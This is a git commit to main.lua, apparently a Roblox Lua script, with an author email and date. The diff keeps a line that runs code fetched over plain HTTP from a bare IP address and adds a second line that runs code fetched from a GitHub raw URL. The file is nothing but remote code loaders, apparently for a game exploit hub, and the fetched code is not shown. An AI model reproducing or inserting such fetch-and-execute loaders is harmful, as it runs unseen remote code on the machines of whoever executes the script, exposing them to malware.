81f0ac91e307bdfa974d2ea88ff0777c6276b38e
exo <dreamurrd@gmail.com>
2025-10-30 23:07:20 +0300

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,2 +1,4 @@
 ID="16bf7f55-20f4-430d-b8f5-05fbe0245443";
+
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
